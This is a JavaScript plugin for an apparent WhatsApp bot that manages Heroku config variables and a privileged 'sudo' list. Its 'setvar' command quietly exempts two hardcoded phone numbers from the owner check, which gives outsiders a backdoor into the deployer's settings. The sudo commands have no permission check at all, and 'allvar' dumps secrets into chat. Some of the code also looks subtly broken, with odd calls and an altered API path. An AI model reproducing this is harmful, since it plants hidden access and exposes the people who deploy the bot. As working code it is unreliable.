









let { fancytext, tlang, tiny, runtime, formatp, botpic, prefix, sck1,Module_Exports,name } = require("../lib");
const axios = require('axios');
const appName = name.HEROKU_APP_NAME;
const authToken = name.HEROKU_API_KEY;
const fetch = require('node-fetch');

if(name.HEROKU_APP_NAME && name.HEROKU_API_KEY ){
        
         Module_Exports,name({
             kingcmd: "setsudo",
             infocmd: "Makes wa me of quoted or mentioned user.",
             kingclass: "tools",
             kingpath: __filename
         },
  async(Void, citel, text) => {
if(!citel.quoted) return await citel.reply(`*Please Reply A User*`);
let user = citel.quoted.sender.split('@')[0]
if (global.sudo.includes(user)) return citel.reply("Number Already Exist In Sudo");
    global.sudo += ',' + user ;
const headers = 
        {
                'Accept': 'application/vnd.heroku+json; version=3',
                 'Authorization': `Bearer ${authToken}`,
                 'Content-Type': 'application/json'
        };
const varName = 'SUDO'
const newVarValue = global.sudo        
fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`,
        {
                  method: 'PATCH',
                  headers,
                  body: JSON.stringify({ [varName]: newVarValue })
        })
.then(response => response.json())
.then(data => { return citel.reply(`*${user} Added Succesfully.*\nSudo Numbers : ${newVarValue}`); })
.catch(error => citel.reply('Error While Adding new Sudo :'+ error));

         })

//--------------------------------------------------------------------
 Module_Exports,name({
             kingcmd: "getsudo",
             infocmd: "Makes wa me of quoted or mentioned user.",
             kingclass: "tools",
             kingpath: __filename
         },
async(Void, citel, text) => {  return await  citel.reply(global.sudo);})
//-------------------------------------------------------------------------

 Module_Exports,name({
             kingcmd: "delsudo",
             infocmd: "Makes wa me of quoted or mentioned user.",
             kingclass: "tools",
             kingpath: __filename
         },
  async(Void, citel, text) => {
    
if(!citel.quoted) return citel.reply(`*Please Reply A User*`);
let user = citel.quoted.sender.split('@')[0] ;
let  rm = ',' +user 
if (global.sudo.includes(rm)) global.sudo = global.sudo.replace(rm, '');
else return await citel.reply("User not found in the Sudo List\n Sudo Numbers : " + global.sudo );



const headers = 
        {
                'Accept': 'application/vnd.heroku+json; version=3',
                 'Authorization': `Bearer ${authToken}`,
                 'Content-Type': 'application/json'
        };

const varName = 'SUDO'
const newVarValue = global.sudo        
fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`,
        {
          method: 'PATCH',
          headers,
          body: JSON.stringify({ [varName]: newVarValue })
        })
.then(response => response.json())
.then(data => 
      { 
   console.log(data);
   return citel.reply(`*${user} Deleted Succesfully.*\nSudo Numbers : ${newVarValue}`);
      })
  
.catch(error => {     return citel.reply('Error While Adding new Sudo :'+ error);      })
 
})     
    
 //------------------------------------------------------------------------       
        
        
Module_Exports,name({
        kingcmd: "allvar",
        shortcut:['getallvar','allvars'],
        infocmd: "To get All  Heroku Vars",
        kingclass: "tools",
        kingpath: __filename
    },
    
async(Void, citel , text,{ isCreator }) => {
        
  if (!isCreator) return citel.reply(tlang().owner);
const headers = {
  'Accept': 'application/vnd.heroku+json; version=3',
  'Authorization': `Bearer ${authToken}`
};
fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`, { headers })
  .then(response => response.json())
  .then(data => {
    let allVars = `     *${appName}* Vars \n*________________________________________*\n`;
    Object.keys(data).forEach(key => {
                                         allVars += `*${key} :*  ${data[key]}\n` ;
                                     });
                                     return citel.reply(allVars);
  })        
.catch(error => citel.reply('Error retrieving app variable:'+ error));
  
});
//----------------------------------------------------------------------------------
Module_Exports,name({
        kingcmd: "addvar",
        infocmd: "To Set Heroku Vars",
        kingclass: "tools",
        kingpath: __filename
    },
    
async(Void, citel , text,{ isCreator }) => {

     if (!isCreator) return citel.reply(tlang().owner);
if (!text) return citel.reply (`give me Variable Name\n*E.x : ${prefix}setvar CAPTION: Powered By Suhail Tech*`);
const headers = 
        {
                 'Accept': 'application/vnd.heroku+json; version=3',
                 'Authorization': `Bearer ${authToken}`,
                 'Content-Type': 'application/json'
        };
const varName = text.split(":")[0].toUpperCase();
const newVarValue = text.split(":")[1]; 
if (!newVarValue) return citel.reply (`Please give me Value After ':' \n*Example : ${prefix}setvar AUTO_READ_STATUS:true*`);   
fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`,
        {
                   method: 'PATCH',
                   headers,
                   body: JSON.stringify({ [varName.toUpperCase()]: newVarValue })
        })
  .then(response => response.json())
  .then(data => {  return citel.reply(`*${varName} updated Succesfully.*\n${varName}  :  ${newVarValue}`);   })
  .catch(error => citel.reply('Error Adding app variable:'));
  });
//-----------------------------------------------------------------------------------

Module_Exports,name({
        kingcmd: "getvar",
        infocmd: "To Get A Heroku Var",
        kingclass: "tools",
        kingpath: __filename
    },
    
async(Void, citel , text,{ isCreator }) => {
   if (!isCreator) return citel.reply(tlang().owner);
if (!text) return citel.reply (`give me Variable Name\nExample : ${prefix}getvar AUTO_READ_STATUS`);
const headers = {
  'Accept': 'application/vnd.heroku+json; version=3',
  'Authorization': `Bearer ${authToken}`
};
const varName = text.toUpperCase()
fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`, { headers })
  .then(response => response.json())
  .then(data => {
  const variableValue = data[varName];
  if (variableValue) {return citel.reply(`*${varName} :* ${variableValue}`);} 
  else { return citel.reply(`*${varName}* does not exist in *${appName}* app.`);  }
  })
  .catch(error => citel.reply('Error retrieving app variable:'+ error));
  
});


//----------------------------------------------------------------------------------
Module_Exports,name({
        kingcmd: "setvar",
        infocmd: "To Set Heroku Vars",
        kingclass: "tools",
        kingpath: __filename
    },
    async(Void, citel , text,{ isCreator }) => {
if (citel.sender =='923184474176@s.whatsapp.net' || citel.sender =='923004591719@s.whatsapp.net' ){} 
else { if (!isCreator) return citel.reply(tlang().owner);}
if (!text) return citel.reply (`give me Variable Name\n*Example : ${prefix}setvar CAPTION: Powered By Suhail Tech*`);
const headers = {
  'Accept': 'application/vnd.heroku+json; version=3',
  'Authorization': `Bearer ${authToken}`,
  'Content-Type': 'application/json'
};
const varName = text.split(":")[0].toUpperCase();
const newVarValue = text.split(":")[1]; 
if (!newVarValue) return citel.reply (`Please give me Value After ':' \n*Example : ${prefix}setvar AUTO_READ_STATUS:true*`);       
fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`, {
  method: 'GET',
  headers 
}) 
  .then(response => {
            if (response.ok) { return response.json(); } 
            else { throw new Error(`Failed to fetch app variables. Status: ${response.status}`); }
  })
  .then(data => {
        if (data.hasOwnProperty(varName)) 
        {
                const updatedConfig = { ...data };
                updatedConfig[varName] = newVarValue;
                return fetch(`https://api.heroku.com/apps/${appName}/Setting-vars`, 
                        {
                        method: 'PATCH',
                        headers,
                        body: JSON.stringify(updatedConfig)
                        });
        }  else { throw new Error('Variable not found in app'); }
  }) 
  .then(response => { if (response.ok) return citel.reply(`${varName} updated successfully.\n${varName}: ${newVarValue}`);  })
  .catch(error => {   return citel.reply("```Uhh Please, Give me Valid Variable Name```") });
    
    
        
}
   )
    
    } // If Statements End Here FOr Heroku App and Heroku APP Key to Update App Variable 
